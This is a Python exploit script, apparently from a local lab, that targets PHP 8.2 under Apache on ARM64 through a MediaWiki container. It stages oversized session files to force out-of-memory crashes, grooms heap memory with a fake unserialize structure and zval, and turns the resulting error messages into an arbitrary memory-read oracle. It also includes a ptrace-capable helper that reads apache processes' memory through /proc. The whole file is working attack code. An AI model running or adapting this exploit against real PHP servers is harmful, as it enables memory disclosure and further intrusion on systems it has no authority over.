#!/usr/bin/env python3
"""a3_arm64_mw.py - GLM5 turn-2 priority 1: the N-oracle ported to ARM64,
running on the NEW mediawiki :8104 target at FULLY STOCK php.ini-production
(memory_limit=128M, display_errors=Off; fatal read container-log side).

Offsets DERIVED from THIS binary (/usr/lib/apache2/modules/libphp.so in the
mediawiki image, ARM aarch64, PHP 8.2.34, commit-anchored by BuildID
fd4e9a3d70d3f171bde258f144f29824e621eefe) - never hardcoded from the x86
build:
  - basic_globals      : BSS symbol @ .so vaddr 0xf1e748 (nm); runtime addr
                         = the GOT entry at vaddr 0xeff220 (adrp eff000+544
                         in php_var_unserialize_init) - read it live, so
                         even the load-base assumption is checked.
  - BG(unserialize).data  @ basic_globals+0x330  (str x0,[x19,#816] in init)
  - BG(unserialize).level @ basic_globals+0x338  (str w1,[x19,#824] in init)
  - d region size: emalloc_large(0x2018=8216) in php_var_unserialize_init.

Design = scripts/a3_symmetric.py (the proven x86 lane's symmetric groom):
  PRODUCER: multipart [PHPSESSID, PROGRESS, sp=<8193B pad>, file] + staged
  75MB session file -> OOM at the session decode; the child SURVIVES
  (apache mod_php) with BG(unserialize) initialized (data=d, level=1).
  CONSUMER: identical body shape with sp=<8193B fake-d groom> + token file
  k|a:1:{i:0;R:1;} -> the groom's read_body takes the SAME hole -> the stale
  child's d now IS our groom -> R:1 resolves data[0] -> fake zval
  {value=TARGET-0x10, type_info=0x106} -> session encode appends *(TARGET)
  bytes -> "tried to allocate N", N = *(TARGET), in the container log.

Self-verifying first target: basic_globals+0x330 -> N must equal the stale
d (known beforehand from the /proc helper scan). Oracle proven at stock
INIs on a fresh ARM64 target => ToB production-grade closure.
"""
import base64
import re
import struct
import subprocess
import sys
import time
import uuid
import os

HOST, PORT, PATH = "127.0.0.1", 8104, "/index.php"
CONT = "mediawiki"
CNAME = "php-firing-range-mediawiki-1"
REPO = "/home/user/php-firing-range"
HELPER_IMG = "php:8.2-apache"      # arm64 native (host-native; no pin)
B = b"WPFIRE"
BIG = 75000000
GROOM_LEN = 8193

# DERIVED from THIS binary (see module docstring; verified live below).
BASIC_GLOBALS_VADDR = 0xF1E748
BG_GOT_VADDR = 0xEFF220            # GOT slot holding &basic_globals
BG_DATA_OFF = 0x330
BG_LEVEL_OFF = 0x338


def cexec(cmd, timeout=20):
    r = subprocess.run(["docker", "compose", "exec", "-T", CONT, "sh", "-c", cmd],
                       capture_output=True, text=True, timeout=timeout, cwd=REPO)
    return r.returncode, r.stdout + r.stderr


def logs_since(ts, extra=1):
    r = subprocess.run(["docker", "compose", "logs", "--since",
                        str(max(int(ts) - extra, 0)), "--tail", "120", CONT],
                       capture_output=True, text=True, timeout=20, cwd=REPO)
    return r.stdout + r.stderr


def mp_body(sid, special_value):
    body = (b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' +
            sid.encode() + b"\r\n" +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n' +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="sp"\r\n'
            b"Content-Type: text/plain\r\n\r\n" + special_value + b"\r\n" +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n" +
            b"--" + B + b"--\r\n")
    head = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + body


def fire(req, timeout=25):
    import socket
    try:
        s = socket.create_connection((HOST, PORT), timeout=15)
        s.sendall(req)
        s.settimeout(timeout)
        buf = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
        s.close()
        return buf
    except ConnectionResetError:
        return b"<RESET>"


def stage_producer_file(sid):
    # programmatic serialized data (gotcha #3): markers + oversized carrier
    markers = [b"MK%02d-%s" % (i, b"S" * (60 * (i + 1))) for i in range(12)]
    head = b"".join(b"p%d|" % i + b's:%d:"' % len(m) + m + b'";' for i, m in enumerate(markers)) + \
           b'poc|a:2:{i:0;' + b's:3:"abc";' + b'i:1;s:%d:"' % BIG
    h64 = base64.b64encode(head).decode()
    t64 = base64.b64encode(b'";}').decode()
    rc, _ = cexec(f"F=/tmp/sess_{sid}; rm -f $F; echo {h64} | base64 -d > $F; "
                  f"head -c {BIG} /dev/zero | tr '\\0' 'A' >> $F; "
                  f"echo {t64} | base64 -d >> $F; "
                  f"chown www-data:www-data $F; chmod 600 $F")
    return rc == 0


def stage_token_file(sid, tok):
    t64 = base64.b64encode(tok).decode()
    rc, _ = cexec(f"echo {t64} | base64 -d > /tmp/sess_{sid}; "
                  f"chown www-data:www-data /tmp/sess_{sid}; chmod 600 /tmp/sess_{sid}")
    return rc == 0


def helper(script, timeout=120):
    r = subprocess.run(["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
                        f"--pid=container:{CNAME}", HELPER_IMG,
                        "bash", "-c", script],
                       capture_output=True, text=True, timeout=timeout, cwd=REPO)
    return r.returncode, r.stdout + r.stderr


def scan_children():
    """For every apache2 child: libphp.so base, basic_globals (via GOT),
    BG(unserialize).data, level. Prints 'pid bias bg data level'."""
    # od -tu8: qword as unsigned decimal - no endianness confusion.
    script = (
        'for P in $(ls /proc | grep -E "^[0-9]+$"); do '
        'C=$(cat /proc/$P/comm 2>/dev/null); [ "$C" = apache2 ] || continue; '
        'M=$(grep libphp /proc/$P/maps 2>/dev/null | head -1 | cut -d- -f1); '
        '[ -z "$M" ] && continue; '
        'BG=$(dd if=/proc/$P/mem bs=1 skip=$((16#$M+16#%X)) count=8 2>/dev/null | od -An -tu8 | tr -d " \\n"); '
        '[ -z "$BG" ] && continue; '
        'D=$(dd if=/proc/$P/mem bs=1 skip=$((BG+16#%X)) count=8 2>/dev/null | od -An -tu8 | tr -d " \\n"); '
        'L=$(dd if=/proc/$P/mem bs=1 skip=$((BG+16#%X)) count=8 2>/dev/null | od -An -tu8 | tr -d " \\n"); '
        'echo "$P $M $BG $D $L"; '
        'done' % (BG_GOT_VADDR, BG_DATA_OFF, BG_LEVEL_OFF))
    rc, out = helper(script)
    kids = []
    for line in out.strip().splitlines():
        f = line.split()
        if len(f) == 5:
            kids.append({"pid": f[0], "bias": int(f[1], 16), "bg": int(f[2]),
                         "data": int(f[3]), "level": int(f[4])})
    return kids


def build_groom(d, target):
    g = bytearray(GROOM_LEN)
    q = lambda off, v: struct.pack_into("<Q", g, off, v)
    dw = lambda off, v: struct.pack_into("<I", g, off, v)
    q(0x00, d + 0x38)       # last -> embedded entries
    q(0x08, 0); q(0x10, 0); q(0x18, 0); q(0x20, 0); q(0x28, 0)
    q(0x30, 0x1000)         # max_depth
    dw(0x38, 1)             # used_slots
    q(0x40, 0)              # next
    q(0x48, d + 0x100)      # data[0] -> fake zval
    q(0x100, target - 0x10) # fake zval.value = TARGET-0x10
    dw(0x108, 0x106)        # IS_STRING
    dw(0x10C, 0)
    return bytes(g)


def fatal_since(ts):
    logs = logs_since(ts)
    m = re.search(r"tried to allocate (\d+)", logs)
    return int(m.group(1)) if m else None


def main():
    print("[*] arm64 N-oracle on mediawiki :8104 (stock php.ini-production)")
    kids = scan_children()
    bgs = {hex(k["bg"]) for k in kids}
    print(f"[*] live scan: {len(kids)} apache children; basic_globals values: {bgs}")
    if kids:
        k0 = kids[0]
        print(f"    e.g. pid={k0['pid']} bias={hex(k0['bias'])} bg={hex(k0['bg'])} "
              f"(base+vaddr? {hex(k0['bias'] + BASIC_GLOBALS_VADDR)}) data={hex(k0['data'])} level={k0['level']}")
        if k0["bg"] != k0["bias"] + BASIC_GLOBALS_VADDR:
            print("    NOTE: GOT-resolved bg != base+0xf1e748 - using GOT value (derived, not assumed)")
    # 1. poison: symmetric producers
    print("[*] poisoning the pool (pad-shape producers)...")
    for i in range(6):
        sidA = "mwA" + uuid.uuid4().hex[:24]
        assert stage_producer_file(sidA)
        t0 = time.time()
        fire(mp_body(sidA, b"P" * GROOM_LEN))
        alloc = fatal_since(t0 + 1)
        print(f"    [{i}] producer fatal-alloc: {alloc}")
    kids = scan_children()
    stale = [k for k in kids if k["level"] not in (0, None) and k["data"] not in (0, None)]
    print(f"[*] stale children: {len(stale)} -> "
          f"{[(k['pid'], hex(k['data']), k['level']) for k in stale[:4]]}")
    if not stale:
        print("[-] no stale child; abort")
        return 1
    k = stale[0]
    d, bias, bg = k["data"], k["bias"], k["bg"]
    target = bg + BG_DATA_OFF
    expected = d
    print(f"[+] stale child {k['pid']}: d=0x{d:x} bg=0x{bg:x}")
    print(f"[*] TARGET=basic_globals+0x330 -> expected N = {expected} (0x{expected:x})")
    groom = build_groom(d, target)

    # 2. consumers
    wins = 0
    for i in range(14):
        stale_now = [x for x in scan_children() if x["level"] not in (0, None) and x["data"] not in (0, None)]
        if not stale_now:
            print("    pool drained; repoison needed"); break
        sidB = "mwB" + uuid.uuid4().hex[:26]
        assert stage_token_file(sidB, b"k|a:1:{i:0;R:1;}")
        t0 = time.time()
        resp = fire(mp_body(sidB, groom))
        n = fatal_since(t0 + 1)
        if n is not None:
            if n == expected:
                wins += 1
                print(f"    [{i}] *** N==d ORACLE: N={n} (0x{n:x}) - "
                      f"ARBITRARY-QWORD READ AT STOCK INIs ON ARM64 ***")
                break
            print(f"    [{i}] N={n} (0x{n:x})"
                  + (" (memory-derived foreign!)" if n not in (BIG + 32, 8216, 0x1000, 134217728) else " (staged-known)"))
        elif len(resp) == 0 or resp == b"<RESET>":
            print(f"    [{i}] crash/reset (delivered but groom/fake-d off)")
        else:
            print(f"    [{i}] normal resp {len(resp)}B - not delivered")
    print("[*] DONE" + (" - ORACLE PROVEN" if wins else " - no win this pass; see notes"))
    return 0 if wins else 1


if __name__ == "__main__":
    sys.exit(main())
